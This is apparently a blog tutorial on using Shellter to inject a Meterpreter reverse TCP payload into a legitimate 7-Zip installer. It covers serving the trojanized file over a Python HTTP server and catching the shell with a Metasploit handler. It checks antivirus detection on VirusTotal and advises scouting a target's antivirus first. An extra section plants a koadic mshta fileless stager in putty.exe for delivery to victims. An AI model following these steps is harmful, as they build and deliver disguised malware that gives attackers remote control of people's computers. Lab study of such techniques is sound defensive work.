---
title: "Inject malicious code into PE using Shellter"
date: "2020-04-11"
layout: single
tags:
- Malware
categories:
- Blog-post
---

Hey everyone. 

This is for research and education purpose only. If you do something bad, do with your own risk.

Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.
It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).

Shellter Website: [https://www.shellterproject.com/](https://www.shellterproject.com/)

We gonna use this tool to inject our meterpreter reverse shell into a clean PE and we will start listening for the shell and execute the malware at the client side.

## Installation

Since Shellter is designed to be run on Windows operating systems, we will install wine

```
apt update
apt install shellter
dpkg --add-architecture i386 && apt-get update && apt-get install wine32 && apt install wine
```

## Download our clean PE file

In my case, I'm using 7zip installer.

```
wget https://www.7-zip.org/a/7z1900.exe
```

## Start shellter
```
shellter
```

![//pic1](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic1.PNG)

## Select Mode and PE path

Shellter can run in either Auto or Manual mode. So, in our case here, we gonna run using Auto mode by selecting `A`. You may want use manual mode for advance option.

For PE target, type the path of your PE location and ENTER.

![//pic2](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic2.PNG)


## Enable stealth mode

Let's wait for a second..

![//pic3](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic3.PNG)

Shellter will then ask us if we want Stealth Mode which it will restore the PE execution flow after our payload has been executed. Choose 'Y' for yes. Then ENTER.

![//pic4](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic4.PNG)

## Choose payload 

It will then ask us to choose between using those displayed payload or our own custom payload. 

Type 'L' for listed payload and select index '1' for Meterpreter reverse TCP payload.

![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic5.PNG)

## Set your IP and Port for the payload

```
SET LHOST: 192.168.83.129
SET LPORT: 4444
```

Shellter then will do his job for us.

## PE Injection done

Shellter will tell us that our injection is verified

![//pic6](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic6.PNG)

## Transfering file

Transfer your malicious PE file to our Windows client. In my case, I'm using Python HTTP server.
```
python -m SimpleHTTPServer 8080
```

Go to our Windows client, navigate to our Kali Linux IP with port 8080 in web browser. Then, download the malicious PE file.

## Set up meterpreter listener

Setup our meterpreter listener to catch our reverse shell after execute the PE file

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.83.129
lhost => 192.168.83.129
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.83.129:4444
```

## Execute and pwned

Soon we download the PE...

 ![//pic7](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic7.PNG)
 
Execute the malicious PE and take a look at our multi handler listener at our Kali Machine.

![//pic8](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic8.PNG)

As you can see above, the binary act normally and our payload is executed. Hooray.

![//pic9](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic9.PNG)

## Scan with VirusTotal

Scanning through VirusTotal results us 25/70 detection.

![//pic10](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic10.PNG)

As you can see, there is a lot of AV that doesnt detect this malware too.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic11.PNG)

So, make sure to gather information about our target client's AV first before attempt to attack.

## Extra: Inject fileless attack using WinExec

We can also inject fileless attack command line using WinExec payload.
But during the prompt of Payloads, we must choose (type) number '7' for WinExec stager.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic12.PNG)

While in your Kali machine, open koadic and run mshta payload. 

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic13.PNG)

Copy the fileless attack command and paste into Shellter with ``cmd /c`` infront of the command to tell windows start cmd with the command we specifed. In our case, we want to run mshta payload. 

If you guys want to execute calculator app. You may want to use ``cmd /c calc.exe`` to execute calc.exe.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic14.PNG)

After pressing 'enter' and wait about a few seconds, our payload now should be verified. We then can deliver the malicious app into victim's machine.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic15.PNG)

Once user execute our malicious putty.exe, their machine will get compromise.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic16.gif)

We're in their machine now. Let's run some cmd command using `exec_cmd` module in koadic.

![//pic11](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/shellter/pic17.PNG)

---

 **Thanks for reading**

